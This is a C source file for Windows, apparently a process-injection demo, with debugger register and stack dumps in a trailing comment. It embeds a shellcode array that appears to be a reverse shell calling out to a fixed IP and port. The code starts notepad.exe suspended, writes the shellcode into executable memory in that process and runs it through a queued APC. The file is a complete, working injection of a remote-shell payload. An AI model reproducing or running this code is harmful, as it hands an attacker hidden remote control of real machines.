#include <windows.h>
#include <stdio.h>

unsigned char payload[] = {"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x51\x56\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
"\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x50\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x13\xba\x0a\xfa\x11\xc0\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5"};

int main(){
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD PID = 0;
    DWORD TID = 0;
    LPVOID lpRemoteBuffer = NULL;
    CONTEXT lpThreadContext = { .ContextFlags = CONTEXT_CONTROL};
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    si.cb = sizeof(STARTUPINFOA); 

    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)){
        printf("CreateProcessA Failed! Error: %d\n", GetLastError());
        return -1;
    }

   
    hProcess = pi.hProcess;
    hThread = pi.hThread;


    lpRemoteBuffer = VirtualAllocEx(hProcess, 0, sizeof(payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (lpRemoteBuffer == NULL){
        printf("VirtualAllocEx Failed! Error: %d\n", GetLastError());
        return -1;
    }

    SIZE_T szWrittenBytes = 0;

    if (!WriteProcessMemory(hProcess, lpRemoteBuffer, payload, sizeof(payload), 0)){
        printf("WriteProcessMemory Failed! Error: %d\n", GetLastError());
        return -1;
    }

    if (!QueueUserAPC((PAPCFUNC)lpRemoteBuffer, hThread, 0)) {
        printf("QueueUserAPC Failed! Error: %d\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);


    return 0;
}

/*
---REGISTER----
RAX : 00007FFC7A944B50     \<kernel32.CreateProcessA>
RBX : 0000000000000000
RCX : 0000000000000000  --> NULL
RDX : 00007FF6D5605050     "notepad.exe"
RBP : 0000001E42FFF8B0
RSP : 0000001E42FFF830  --> STACK 
RSI : 0000000000000000
RDI : 0000000000000000
R8  : 0000000000000000  --> NULL
R9  : 0000000000000000  --> NULL
R10 : 00007FFC79340000     ucrtbase.00007FFC79340000
R11 : 00007FFC7942DF3B     ucrtbase.00007FFC7942DF3B
R12 : 0000000000000000
R13 : 0000000000000000
R14 : 0000000000000000
R15 : 0000000000000000
RIP : 00007FF6D5601858     apc.00007FF6D5601858
RFLAGS : 0000000000000300     L'̀'
ZF : 0
OF : 0
CF : 0
PF : 0
SF : 0
TF : 1
AF : 0
DF : 0
IF : 1
LastError : 0000007E (ERROR_MOD_NOT_FOUND)
LastStatus : C0000135 (STATUS_DLL_NOT_FOUND)

---STACK----
0000008C6CDFF6F0  0000000000000000  --> Shadow Space  
0000008C6CDFF6F8  0000000000000000  --> Shadow Space
0000008C6CDFF700  0000000000000000  --> Shadow Space
0000008C6CDFF708  0000000000000000  --> Shadow Space
0000008C6CDFF710  0000000000000000  --> FALSE
0000008C6CDFF718  0000000000000004  --> CREATE_SUSPENDED  
0000008C6CDFF720  0000000000000000  --> lpEnviroment = NULL
0000008C6CDFF728  0000000000000000  --> lpCurrentDirectory = NULL
0000008C6CDFF730  0000008C6CDFF760  --> &si (STARTUPINFO)
0000008C6CDFF738  0000008C6CDFF740  --> &pi (PROCESS_INFORMATION)

---

----REGISTER----
RAX : 00007FFC7A943020     <kernel32.VirtualAllocEx>
RBX : 0000000000000000
RCX : 0000000000000324  --> hProcess
RDX : 0000000000000000  --> NULL
RBP : 000000914EDFF520
RSP : 000000914EDFF4A0
RSI : 0000000000000000
RDI : 0000000000000000
R8  : 00000000000001FF  --> sizeof(payload)
R9  : 0000000000003000  --> 0x3000 = MEM_COMMIT (0x1000) | MEM_RESERVE (0x2000)
R10 : 000002139CCB0000
R11 : 000000914EDFF110
R12 : 0000000000000000
R13 : 0000000000000000
R14 : 0000000000000000
R15 : 0000000000000000
RIP : 00007FF6D56018C2     apc.00007FF6D56018C2
RFLAGS : 0000000000000300     L'̀'
ZF : 0
OF : 0
CF : 0
PF : 0
SF : 0
TF : 1     L'ā'
AF : 0
DF : 0
IF : 1
LastError : 00000000 (ERROR_SUCCESS)
LastStatus : C000007C (STATUS_NO_TOKEN)

----STACK----
000000914EDFF4A0  0000000000000000  --> Shadow Space
000000914EDFF4A8  0000000000000000  --> Shadow Space
000000914EDFF4B0  0000000000000000  --> Shadow Space
000000914EDFF4B8  0000000000000000  --> Shadow Space
000000914EDFF4C0  0000000000000040  --> flProtect (0x40 = PAGE_EXECUTE_READWRITE)

---

----REGISTER----
RAX : 00007FFC7A940590     <kernel32.WriteProcessMemory>
RBX : 0000000000000000
RCX : 0000000000000324  --> hProcess
RDX : 000001B6CD950000  --> lpRemoteBuffer
RBP : 000000914EDFF520
RSP : 000000914EDFF4A0
RSI : 0000000000000000
RDI : 0000000000000000
R8  : 00007FF6D5604020  apc.00007FF6D5604020 --> payload
R9  : 00000000000001FF  --> sizeof(payload)   
R10 : 0000000000000000
R11 : 0000000000000246     L'Ɇ'
R12 : 0000000000000000
R13 : 0000000000000000
R14 : 0000000000000000
R15 : 0000000000000000
RIP : 00007FF6D5601935     apc.00007FF6D5601935
RFLAGS : 0000000000000304     L'̄'
ZF : 0
OF : 0
CF : 0
PF : 1
SF : 0
TF : 1     L'ā'
AF : 0
DF : 0
IF : 1
LastError : 00000000 (ERROR_SUCCESS)
LastStatus : C000007C (STATUS_NO_TOKEN)

----STACK----
000000914EDFF4A0  0000000000000000  --> Shadow Space 
000000914EDFF4A8  000001B6CD950000  --> Shadow Space
000000914EDFF4B0  0000000000001000  --> Shadow Space
000000914EDFF4B8  0000000000000000  --> Shadow Space
000000914EDFF4C0  0000000000000000  --> NULL

---

RAX : 00007FFC7A93A880     \<kernel32.QueueUserAPC>
RBX : 0000000000000000
RCX : 000002C4959C0000  --> lpRemoteBuffer
RDX : 0000000000000308  --> hThread
RBP : 000000B4385FF2D0
RSP : 000000B4385FF250
RSI : 0000000000000000
RDI : 0000000000000000
R8  : 0000000000000000  --> 0
R9  : 0000000000000000
R10 : 0000000000000000
R11 : 0000000000000246     L'Ɇ'
R12 : 0000000000000000
R13 : 0000000000000000
R14 : 0000000000000000
R15 : 0000000000000000
RIP : 00007FF6D560197D     apc.00007FF6D560197D
RFLAGS : 0000000000000300     L'̀'
ZF : 0
OF : 0
CF : 0
PF : 0
SF : 0
TF : 1     L'ā'
AF : 0
DF : 0
IF : 1
LastError : 00000000 (ERROR_SUCCESS)
LastStatus : C000007C (STATUS_NO_TOKEN)

---

----REGISTER----
RAX : 00007FFC7A93BC90     <kernel32.ResumeThread>
RBX : 0000000000000000
RCX : 00000000000002F8  --> (hThread -> notepad.exe)
RDX : 0000000000000000
RBP : 000000914EDFF520
RSP : 000000914EDFF4A0
RSI : 0000000000000000
RDI : 0000000000000000
R8  : 000000914EDFF438
R9  : 0000000000000000
R10 : 0000000000000000
R11 : 0000000000000246     L'Ɇ'
R12 : 0000000000000000
R13 : 0000000000000000
R14 : 0000000000000000
R15 : 0000000000000000
RIP : 00007FF6D56019DB     apc.00007FF6D56019DB
RFLAGS : 0000000000000300     L'̀'
ZF : 0
OF : 0
CF : 0
PF : 0
SF : 0
TF : 1     L'ā'
AF : 0
DF : 0
IF : 1
LastError : 00000000 (ERROR_SUCCESS)
LastStatus : C000007C (STATUS_NO_TOKEN)
*/